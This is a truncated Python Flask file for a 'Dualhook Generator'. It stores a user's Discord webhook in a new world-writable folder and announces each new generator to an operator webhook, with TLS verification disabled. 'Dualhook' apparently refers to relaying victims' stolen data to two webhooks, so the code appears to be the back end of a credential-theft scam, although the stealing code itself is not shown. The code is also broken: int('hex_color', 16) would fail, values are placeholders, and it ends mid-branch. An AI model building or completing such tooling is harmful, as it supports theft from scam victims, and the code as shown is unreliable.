from flask import Flask, request, render_template, redirect, url_for
import os
import requests
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def dualhook_generator():
    if request.method == 'POST':
        directory = request.form.get('directory')
        dwebhook = request.form.get('dwebhook')
        parse = dwebhook.split('//')[1].split('/')[0]
        if parse == 'discord.com' or parse == 'discordapp.com':
            directory = clear_dir(directory)
            if directory:
                filename = f"controlPage/{directory}"
                if not os.path.exists(filename):
                    os.makedirs(filename, 0o777, True)
                    with open(f"{filename}/index.html", 'w') as f:
                        f.write("Dualhook Page Content")  # Replace with actual content
                    with open(f"{filename}/d_webhook.txt", 'w') as f:
                        f.write(dwebhook)
                    domain = f"{request.scheme}://{request.host}"
                    timestamp = datetime.now().isoformat()
                    headers = {"Content-Type": "application/json; charset=utf-8"}
                    POST = {
                        "username": "Bot",
                        "avatar_url": "thumbnail_url",
                        "content": "@everyone **New User Made Dualhook Generator 🔥**",
                        "embeds": [
                            {
                                "title": "Check their Generator.",
                                "type": "rich",
                                "url": f"{domain}/controlPage/{directory}",
                                "color": int("hex_color", 16),
                                "footer": {
                                    "text": f"Name • {timestamp}",
                                    "icon_url": "thumbnail_url"
                                },
                                "thumbnail": {
                                    "url": "thumbnail_url",
                                },
                                "fields": [
                                    {
                                        "name": "**Dualhook Generator**",
                                        "value": f"```Dualhook Gen: {domain}/controlPage/{directory}```",
                                        "inline": True
                                    },
                                ]
                            },
                        ],
                    }
                    response = requests.post("webhook_url", headers=headers, json=POST, verify=False)
                    return redirect(url_for('control_page', directory=directory))
                else:
                    error = 'This directory is already in use!'
                    return render_template
